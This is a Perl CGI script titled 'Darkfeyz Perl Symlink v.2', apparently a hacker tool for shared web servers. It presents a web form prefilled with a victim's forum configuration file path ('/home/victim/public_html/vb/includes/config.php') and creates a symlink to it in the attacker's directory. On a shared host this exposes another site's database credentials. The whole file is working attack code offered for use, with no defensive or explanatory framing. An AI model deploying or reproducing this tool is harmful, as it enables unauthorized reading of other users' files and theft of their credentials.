#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Darkfeyz Perl Symlink</title>
<style type="text/css">
.newStyle1 {
font-family: Tahoma;
font-size: small;
font-weight: bolder;
font-style: normal;
text-transform: none;
color: #ccff00;
background-color: #000000;
}
.style1 {
text-align: center;
}
</style>
</head>

<body class="newStyle1">

<p class="style1">Perl Symlink v.2</p>
<p class="style1">Coded By <font color="#FF0000">Darkfeyzi</font></p>';
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if($FORM{vic} eq "" or $FORM{fl} eq ""){
print '
<form method="post">
<div class="style1">
<br>
<input name="vic" type="text" style="border:1px dotted #CCFF00; width: 456px; height: 24px; font-family:Tahoma; font-size:8pt; color:#CCFF00; background-color:#000000" value="/home/victim/public_html/vb/includes/config.php" />
<br>
<div class="style1">
<br>
<input name="fl" type="text" style="border:1px dotted #ccff00; width: 456px; height: 24px; font-family:Tahoma; font-size:8pt; color:#ccff00; background-color:#000000" value="'.qx(pwd).'/D4feyz.txt" /></div><div class="style1">
<br>
<input name="Submit1" type="submit" value="Go" style="border-style:dotted; border-width:1px; width: 93px; font-family:Tahoma; font-size:8pt; color:#ccff00; background-color:#000000" /><br />
<br>
https://darkfeyzweb.wordpress.com/</div>
<br>
</form>
</body>

</html>
';}
else{
symlink($FORM{vic},$FORM{fl});
print '<div class="style1">
  Done ....<br />
<br />
  Created in:'.$FORM{fl}.'</div>
</body>

</html>
';}
